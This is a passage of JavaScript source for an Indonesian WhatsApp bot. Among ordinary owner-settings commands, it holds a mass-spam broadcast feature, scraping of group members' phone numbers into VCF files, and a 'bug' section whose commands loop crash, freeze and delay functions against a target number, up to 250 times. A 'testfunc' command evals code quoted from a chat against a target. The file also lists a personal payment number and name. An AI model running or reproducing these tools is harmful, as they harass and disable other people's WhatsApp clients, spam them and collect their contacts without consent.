      await reyz.sendMessage(halls[i], { text: pesan }, { quoted: qR9X });
      success++;
      contacts.push(halls[i]);
    } catch { failed++; }
    await sleep(delay);

    // Progres tiap 20%
    const percent = Math.floor(((i + 1) / halls.length) * 100);
    if (percent % 20 === 0 || i + 1 === halls.length) {
      const bar = makeProgressBar(i + 1, halls.length);
      await reyz.sendMessage(m.chat, {
        text: `*Progres Broadcast*\n${i + 1}/${halls.length} kontak\n${bar}\n\n⚠️ Jangan jalankan command lain dulu.`
      }, { edit: progMsg.key });
    }
  }

  // Generate VCF File
  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((lid, i) => {
    const pn = phoneMap[lid];
  if (!pn) return null;

  const num = pn.split("@")[0];
  return [
    'BEGIN:VCARD',
    'VERSION:3.0',
    `FN:${contactName} ${i + 1}`,
    `TEL;type=CELL;type=VOICE;waid=${num}:+${num}`,
    'END:VCARD', ''
  ].join('\n');
}).filter(Boolean).join('\n');

    fs.writeFileSync('./database/push_contacts.vcf', vcardContent, 'utf8');

    await reyz.sendMessage(m.sender, {
      document: fs.readFileSync('./database/push_contacts.vcf'),
      mimetype: 'text/vcard',
      fileName: 'contacts.vcf',
      caption: `✅ *Push Kontak Selesai!*\nTotal: ${halls.length}\nSukses: ${success}\nGagal: ${failed}`
    }, { quoted: qR9X });

  } catch (err) {
    console.error('❌ Gagal generate vcf:', err);
    await reply('⚠️ Push selesai, namun gagal membuat file .vcf');
  }
}
break

case 'savekontak': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();

  const buildVcard = (list, contactName) => {
    let vcard = ''
    let no = 1

    for (let jid of list) {
      const num = jid.split('@')[0]
      vcard += `BEGIN:VCARD
VERSION:3.0
FN:${contactName} ${no}
TEL;type=CELL;type=VOICE;waid=${num}:+${num}
END:VCARD

`
      no++
    }

    return vcard
  }

  const getContacts = (participants) => {
    return [...new Set(
      participants
        .map(p => p.phoneNumber || p.id)
        .filter(jid => jid && jid.endsWith('@s.whatsapp.net') && jid !== m.sender)
    )]
  }

  // MODE GRUP
  if (m.isGroup && !text.includes('|')) {
    if (!text) return example("nama kontak");

    const contactName = text.trim()
    let metadata

    try {
      metadata = await reyz.groupMetadata(m.chat)
    } catch (e) {
      return reply("❌ Gagal mengambil metadata grup!")
    }

    const kontakUnik = getContacts(metadata.participants)

    if (!kontakUnik.length) return reply("⚠️ Tidak ada kontak yang bisa disimpan!")

    const vcardList = buildVcard(kontakUnik, contactName)
    const filePath = './database/kontak-grup.vcf'

    fs.writeFileSync(filePath, vcardList)

    await reyz.sendMessage(m.sender, {
      document: fs.readFileSync(filePath),
      fileName: 'kontak-grup.vcf',
      mimetype: 'text/x-vcard',
      caption: `📥 *Kontak Grup Tersimpan!*\n\n👥 Grup: *${metadata.subject}*\n📁 Jumlah: *${kontakUnik.length}*\n🔖 Nama Kontak: *${contactName}*`,
    }, { quoted: qR9X })

    await reply("✅ File kontak berhasil dikirim ke chat pribadi Anda!")
    fs.unlinkSync(filePath)
  }

  // MODE PV PAKAI IDGC|NAMA
  else {
    if (!text.includes('|')) {
      return example("<idgc>|<namakontak>\nKetik *.listgc* untuk menampilkan idgc")
    }

    const [idgc, contactName] = text.split('|').map(v => v.trim())
    if (!idgc || !contactName) return reply("✖️ Format salah!")

    let metadata
    try {
      metadata = await reyz.groupMetadata(idgc)
    } catch (e) {
      return reply("✖️ ID grup tidak valid atau bot tidak ada di grup!")
    }

    const kontakUnik = getContacts(metadata.participants)
    if (!kontakUnik.length) return reply("⚠️ Tidak ada kontak yang bisa disimpan!")

    const vcardList = buildVcard(kontakUnik, contactName)
    const filePath = './database/kontak-saved.vcf'

    fs.writeFileSync(filePath, vcardList)

    await reyz.sendMessage(m.sender, {
      document: fs.readFileSync(filePath),
      fileName: "kontak-saved.vcf",
      mimetype: "text/x-vcard",
      caption: `*✅ Kontak Berhasil Disimpan!*\n📁 Total: *${kontakUnik.length}* kontak\n📌 Nama: *${contactName}*`,
    }, { quoted: qR9X })

    reply("✅ File kontak berhasil dikirim ke chat pribadi Anda!")
    fs.unlinkSync(filePath)
  }
}
break
case "tutor":
case "tutorial": {
let ttutor = `
📦 *PUSH KONTAK GRUP TERBUKA*
Digunakan untuk push kontak dari dalam grup itu sendiri (terbuka), tanpa ID grup.

🔸 *.pushkontak teksmu*
🔸 *.pushkontak2 teksmu*
🔸 *.pushkontak3 jeda|teksmu*

📌 *Catatan:*
- Kirim perintah langsung di dalam grup target.
- *jeda* adalah delay per kontak. Contoh: \`1000 = 1 detik\`.
- Auto-save hanya berlaku untuk *.pushkontak2* dan *.pushkontak3*.
- *pushkontak* biasa hanya mengirim tanpa simpan kontak.

📡 *PUSH KONTAK GRUP TERTUTUP*
Digunakan untuk push kontak dari luar grup, menggunakan ID grup manual.

🔸 *.pushkontakid idgc|teksmu*
🔸 *.pushkontakid2 idgc|teksmu*
🔸 *.pushkontakid3 idgc|jeda|teksmu*

📌 *Contoh:*
\`\`\`
.pushkontakid2 1203xxx@g.us|Save saya
.pushkontakid3 1203xxx@g.us|1500|Save saya
\`\`\`

📌 *Catatan:*
- Ketik *.listgc* atau *.cekidgc* untuk melihat ID grup.
- pushkontakid tidak auto-save, pushkontakid2 dan pushkontak3 auto-save.
- *pushkontakid3* paling advance karena ada delay dan nama kontak!

💾 *SAVE KONTAK (AUTO / MANUAL)*
Digunakan untuk menyimpan kontak member grup sebelum push.

🔸 *.savekontak idgc|nama* (private message)
🔸 *.savekontak nama* (dalam grup)

📌 *Contoh:*
\`\`\`
.savekontak 1203xxx@g.us|buyerku
.savekontak buyerku
\`\`\`

📣 *JPM / BROADCAST GROUP CHAT*
Digunakan untuk mengirim pesan ke seluruh grup, dengan atau tanpa tag.

🔸 *.jpm teksmu* — Kirim pesan biasa
🔸 *.jpmht teksmu* — Kirim pesan + mention semua anggota
🔸 *.bljpm on/off|<angka>* (private message)
🔸 *.bljpm on/off* (dalam grup)

*Auto Jpm Beta*
.autojpm on
.autojpm off
.autojpm add <teks/caption> (reply gambar/video jika ada media)
.autojpm del <nomor/all>
.autojpm set <angka> menit/jam/hari

📌 *Tips:*
- Kamu bisa kirim media juga, dengan reply atau caption media + cmd.
- Hindari spam *.jpmht* agar tidak mengganggu member 🙏

⚠️ *PERINGATAN DAN SARAN:*
- Jangan push terlalu cepat, bisa kena limit WhatsApp!
- Gunakan jeda minimal \`6000 ms\` (6 detik) agar lebih aman.
- Simpan kontak dulu sebelum push untuk memperbesar deliver rate & menghindari blokir.

_*© ReyzTzx*_
  `
await reyz.sendMessage(m.chat, {
  text: ttutor,
  contextInfo: {
    isForwarded: true,
    mentionedJid: [m.sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: idSaluran,
      newsletterName: nameSaluran
    },
    externalAdReply: {
      title: `© ${namabot} - v${version}`,
      body: `Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: img,
      renderLargerThumbnail: false,
      sourceUrl: '',
      mediaType: 1
    }
  }
}, { quoted: qR9X });
}
break

//——————————[ Case Fitur Store ]——————————//
case "dana": {
  let teks = `
*Nomor Dana :*
083177843144
*A/N :* DESI NURXX

*Note :*
Demi Keamanan Bersama, Buyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
  `.trim()
  await reyz.sendMessage(m.chat, {
      text: teks
    }, { quoted: qR9X })
  break
}
case "ovo": {
if (global.ovo == false) return reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}
*A/N :* ${an.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
await reyz.sendText(m.chat, teks, qR9X)
}
break
case "gopay": {
if (global.gopay == false) return reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}
*A/N :* ${an.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
await reyz.sendText(m.chat, teks, qR9X)
}
break
case "qris": {
  const qrisPath = "system/media/qris.jpg"
  if (!fs.existsSync(qrisPath)) {
    return reply("Payment QRIS Tidak Tersedia")
  }
  reply("Memproses Mengambil QRIS, Tunggu Sebentar . . .")
  const teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*
_WAJIB TAMBAH 500P KALAU PAKAI QRIS_
*Note :*
Demi Keamanan Bersama, Buyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
  `.trim()
  await reyz.sendMessage(m.chat, {
      image: fs.readFileSync(qrisPath),
      caption: teks
    }, { quoted: qR9X })
  break
}

//——————————[ Case Fitur Owner ]——————————//
case "setppbot": case "setpp": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (/image/g.test(mime)) {
let media = await reyz.downloadAndSaveMediaMessage(qmsg)
await reyz.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Profil ✅*")
} else return example("dengan mengirim foto")
}
break
case "setnamabot": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example("teksnya")
reyz.updateProfileName(text)
reply("*Berhasil Mengganti Nama Bot ✅*")
}
break
case "setbio": case "setbiobot": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example("teksnya")
reyz.updateProfileStatus(text)
reply("*Berhasil Mengganti Bio Bot ✅*")
}
break
case "getcase": {
   if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
   if (!text) return reply(example("menu"))

   const getcase = (cases) => {
      let data = fs.readFileSync('./command.js', 'utf-8')
      let regex = new RegExp(`case ['"]${cases}['"]([\\s\\S]*?)break`, "i")
      let hasil = data.match(regex)
      return hasil ? hasil[0] : null
   }

   let result = getcase(text)
   if (result) {
      reply(result)
   } else {
      reply(`❌ Case *${text}* Tidak Ditemukan`)
   }
}
break

case "autoread": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
if (text.toLowerCase() == "on") {
if (autoread) return reply("*Autoread* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = true
reply("*Berhasil Menyalakan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = false
reply("*Berhasil Mematikan Autoread ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break

case "autoreadsw": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
if (text.toLowerCase() == "on") {
if (autoreadsw) return reply("*Autoreadsw* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = true
reply("*Berhasil Menyalakan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoreadsw) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoreadsw = false
reply("*Berhasil Mematikan Autoreadsw ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
}}
break

case "anticall": {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
if (text.toLowerCase() == "on") {
if (anticall) return reply("*Anticall* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = true
reply("*Berhasil Menyalakan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return reply("*Anticall* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = false
reply("*Berhasil Mematikan Anticall ✅*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
}}
break

case "autojoingc": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    if (!text) return example("on/off")

    let input = text.trim().toLowerCase()
    if (input === "on") {
    if (autojoingc) return reply("*Autojoingc* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
        autojoingc = true
        reply("✅ Fitur Auto Join GC berhasil diaktifkan.")
    } else if (input === "off") {
    if (autojoingc) return reply("*Autojoingc* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
        autojoingc = false
        reply("✅ Fitur Auto Join GC berhasil dimatikan.")
    } else {
        return example("on/off")
    }
}
break
case "setting":
case "settingbot":
case "option":
case "statusbot": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

  var teks = `
*List Status Setting Bot :*

* Autoread   : ${global.autoread ? "*Aktif*" : "*Tidak Aktif*"}
* Autoreadsw : ${global.autoreadsw ? "*Aktif*" : "*Tidak Aktif*"}
* Autojoingc : ${global.autojoingc ? "*Aktif*" : "*Tidak Aktif*"}
* Anticall   : ${global.anticall ? "*Aktif*" : "*Tidak Aktif*"}
* AutoJPM    : ${penting.autoJpm.status ? "*Aktif*" : "*Tidak Aktif*"}

*Contoh Penggunaan :*
.autoread on/off
`
  reply(teks)
}
break
case 'addcase': {
 if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
 if (!text) return reply('Mana case nya');
const namaFile = 'command.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Sukses Menambahkan Fitur\nJika Ingin Menginfokan Ss Dan Reply Ssan Barcaption .newfitur');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'delcase': {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
if (!text) return example('Mana case nya bang?');
dellCase('./command.js', q)
reply('Berhasil menghapus case!.');
}
break
case 'self':
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  reyz.public = false
  reply('Berhasil masuk ke mode *Self* (hanya owner yang bisa menggunakan bot)')
  break

case 'public':
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  reyz.public = true
  reply('Berhasil masuk ke mode *Public* (semua orang bisa menggunakan bot)')
  break

case 'addowner': case 'addown': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const target = (Input || text || '').replace(/[^0-9]/g, '')
  if (!target) return example('62xxxxxxxxxx')
  const res = addOwner(target)
  reply(res.message)
}
break

case 'delowner': case 'delown': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const target = (Input || text || '').replace(/[^0-9]/g, '')
  if (!target) return example('62xxxxxxxxxx')
  const res = delOwner(target)
  reply(res.message)
}
break

case 'addpremium': case 'addprem': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const target = (Input || text || '').replace(/[^0-9]/g, '')
  if (!target) return example('62xxxxxxxxxx')
  const res = addPremium(target)
  reply(res.message)
}
break

case 'delpremium': case 'delprem': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const target = (Input || text || '').replace(/[^0-9]/g, '')
  if (!target) return example('62xxxxxxxxxx')
  const res = delPremium(target)
  reply(res.message)
}
break

case 'listowner': case 'listown': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const owners = readOwners()
  reply(`*┌─「 DAFTAR OWNER 」*\n${owners.map((v, i) => `*│* ${i + 1}. ${v}`).join('\n') || '*│* - kosong -'}\n*└──────────────*`)
}
break

case 'listpremium': case 'listprem': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  const prems = readPremiums()
  reply(`*┌─「 DAFTAR PREMIUM 」*\n${prems.map((v, i) => `*│* ${i + 1}. ${v}`).join('\n') || '*│* - kosong -'}\n*└──────────────*`)
}
break

//——————————[ Case Fitur Bvg ]——————————//
case 'thunder': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 10; r++) {
        await CrashClick(target);
    }
}
break
case 'flexi': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 10; r++) {
        await flexi1(target);
    }
}
break
case 'tensei': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 10; r++) {
        await DelayXFreezeInvis(target);
        await DelayInvis1(target);
        await DelayInvis2(target);
    }
}
break
case 'texas ': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 10; r++) {
        await R9X(reyz, target);
    }
}
break
case 'sagata': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 10; r++) {
        await DelayXFreezeInvis(target);
        await DelayInvis1(target);
        await DelayInvis2(target);
    }
}
break
case 'flax': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 20; r++) {
        await DelayXFreezeInvis(target);
        await FreezeClick(target);
        await FreezeClick2(target);
    }
}
break
case 'bom': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!q) return example('62xxx');

    let pepec = q.replace(/[^0-9]/g, '');
    let target = pepec + '@s.whatsapp.net';

    ButDone(`〔 ✓ 〕Target : ${pepec}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`);

    for (var r = 0; r < 20; r++) {
        await DelayXFreezeInvis(target);
        await BlankClick(target);
        await BlankClick2(target);
    }
}
break
case 'excute': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    if (!q) return example(`62xxx`)

    let target
    if (q.includes("@g.us")) {
        target = q.trim()
    } else {
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    }

    ButDone(`〔 ✓ 〕Target : ${target}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed
〔 ⚠ 〕Delay 10 Menit Sebelum Penggunaan Berikutnya`)

    for (var r = 0; r < 250; r++) {
        await sharePhoneNotif(target)
    }
}
break
case 'nova': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'zero': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'dark': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'claus': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'santa': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'turbo': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'fvck': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
    if (!m.chat) return reply("Chat tidak ditemukan");

    ButDone(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`);

    for (var r = 0; r < 20; r++) {
        await p(m.chat);
    }
}
break
case 'damn': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    if (!m.chat) return reply("Chat tidak ditemukan")

    await reply(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Started`)

    try {
        for (let r = 0; r < 2; r++) {
            await sharePhoneNotif(m.chat)
        }

        await reply(`〔 ✓ 〕Target : ${m.chat}
〔 ✓ 〕Feature : ${prefix + command}
〔 ✓ 〕Process : Completed`)
    } catch (e) {
        console.error("damn Error:", e)
        await reply(`❌ Gagal: ${e?.message || e}`)
    }
}
break
//——————————[ Case Fitur Function ]——————————//
case 'testfunc': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    if (!text) return example(`62xxx|5`)
    if (!m.quoted?.text) return example("*Reply pesan berisi function!*")

    let [num, cnt] = text.split('|')
    let target = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    let count = parseInt(cnt) || 1

    if (count > 200) count = 200

    let funcCode = m.quoted.text

    try {
        const funcName = funcCode.match(/function\s+([a-zA-Z0-9_]+)/)?.[1]

        if (!funcName) return reply("Function tidak valid")

        eval(`
${funcCode}
globalThis["${funcName}"] = ${funcName}
        `)

        if (typeof globalThis[funcName] !== 'function') {
            return reply("Function tidak valid")
        }

        for (let i = 0; i < count; i++) {
            await globalThis[funcName](reyz, target)
            console.log(`Success ${i + 1}`)
        }

        ButDone(
`[ √ ] Sukses Test Function
[ √ ] Function: ${funcName}
[ √ ] Target: ${target}
[ √ ] Loop: ${count}x`
        )

    } catch (e) {
        reply(`ERROR ❌\n${e.stack || e.message}`)
    }
}
break
case 'checkfunc': {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    if (!m.quoted || !m.quoted.text) return example(`reply async function`)

    let funcCode = m.quoted.text
    let status = ""
    let resultText = ""

    try {
        new Function(funcCode)

        let funcName = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/)?.[1]
        if (!funcName) throw new Error("Harus async function")

        let wrapped = `(async () => { ${funcCode}; return ${funcName}; })()`
        let fn = await eval(wrapped)

        if (typeof fn !== 'function') throw new Error("Function tidak valid")

        status = "✅ SAFE / TIDAK ADA ERROR"

        resultText = funcCode
            .split('\n')
            .map(line => line)
            .join('\n')

    } catch (e) {
        let errLine = 0

        let match = e.stack?.match(/<anonymous>:(\d+):\d+/)
        if (match) errLine = parseInt(match[1]) - 1

        let lines = funcCode.split('\n')

        resultText = lines.map((line, i) => {
            if (i === errLine) return line + "  👈 ERROR"
            return line
        }).join('\n')

        status = `❌ ERROR: ${e.message}`
    }

    reply(`📦 *CHECK FUNCTION*\n\n${resultText}\n\n${status}`)
}
break
case "getrawcode": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

    const data = m.quoted
        ? { [m.quoted.mtype]: m.quoted }
        : { [m.mtype]: m.message }

    reply(JSON.stringify(data, null, 2))
}
break
case "strukcode": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

    const data = m.quoted
        ? { [m.quoted.mtype]: m.quoted }
        : { [m.mtype]: m.message }

    const json = JSON.stringify(data, null, 2)

    reply(`reyz.relayMessage(m.chat, ${json}, {})`)
}
break
case "ambilfunc": {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

    const data = m.quoted
        ? { [m.quoted.mtype]: m.quoted }
        : { [m.mtype]: m.message }

    const json = JSON.stringify(data, null, 2)

    const func = `async function reyz(target) {
    await reyz.relayMessage(target, ${json}, {})
}`

    reply(func)
}
break
case "gethtml":
case "source": {
    const text = m.text.split(" ").slice(1).join(" ").trim();

    if (!text) {
        await reyz.sendMessage(
            m.chat,
            {
                text: "❌ Gunakan:\n/source https://example.com"
            },
            { quoted: qR9X }
        );
        break;
    }

    let baseUrl;

    try {
        baseUrl = new URL(text);

        if (!["http:", "https:"].includes(baseUrl.protocol)) {
            throw new Error();
        }
    } catch {
        await reyz.sendMessage(
            m.chat,
            {
                text: "❌ URL tidak valid!"
            },
            { quoted: qR9X }
        );
        break;
    }

    const folderName = baseUrl.hostname
        .replace(/\./g, "_")
        .replace(/[^a-zA-Z0-9_-]/g, "_");

    const saveDir = path.join(__dirname, folderName);
    const zipPath = path.join(__dirname, `${folderName}.zip`);

    const queue = [];
    const queued = new Set();
    const visited = new Set();
    const failed = new Map();
    const urlMap = new Map();
    const contentMap = new Map();

    const MAX_FILES = 1500;
    const MAX_FILE_SIZE = 50 * 1024 * 1024;
    const REQUEST_TIMEOUT = 30000;

    let berhasil = 0;
    let gagal = 0;
    let halaman = 0;

    const normalizeUrl = (value, parent) => {
        try {
            if (!value) return null;

            value = String(value).trim();

            if (
                !value ||
                value.startsWith("#") ||
                value.startsWith("data:") ||
                value.startsWith("blob:") ||
                value.startsWith("javascript:") ||
                value.startsWith("mailto:") ||
                value.startsWith("tel:") ||
                value.startsWith("about:")
            ) {
                return null;
            }

            if (value.startsWith("//")) {
                value = new URL(parent).protocol + value;
            }

            const u = new URL(value, parent);

            if (!["http:", "https:"].includes(u.protocol)) {
                return null;
            }

            u.hash = "";

            return u.href;
        } catch {
            return null;
        }
    };

    const isAllowedUrl = (url) => {
        try {
            const u = new URL(url);
            return u.hostname === baseUrl.hostname;
        } catch {
            return false;
        }
    };

    const addQueue = (url) => {
        const normalized = normalizeUrl(
            url,
            baseUrl.href
        );

        if (!normalized) return;
        if (!isAllowedUrl(normalized)) return;
        if (queued.has(normalized)) return;
        if (visited.has(normalized)) return;
        if (failed.has(normalized)) return;
        if (queued.size >= MAX_FILES) return;

        queued.add(normalized);
        queue.push(normalized);
    };

    const sanitizeSegment = (value) => {
        return decodeURIComponent(value || "")
            .replace(/[<>:"|?*\x00-\x1F]/g, "_")
            .replace(/\s+/g, "_")
            .replace(/^\.+$/, "_")
            .slice(0, 180);
    };

    const getLocalPath = (url, contentType = "") => {
        const u = new URL(url);

        let pathname = decodeURIComponent(
            u.pathname || "/"
        );

        pathname = pathname
            .replace(/\\/g, "/")
            .replace(/\/+/g, "/");

        let parts = pathname
            .split("/")
            .filter(Boolean)
            .map(sanitizeSegment);

        let filename = parts.pop() || "";

        const htmlType =
            contentType.includes("text/html") ||
            contentType.includes("application/xhtml");

        if (!filename) {
            filename = htmlType
                ? "index.html"
                : "index";
        }

        if (pathname.endsWith("/")) {
            parts.push(filename);
            filename = htmlType
                ? "index.html"
                : "index";
        }

        if (
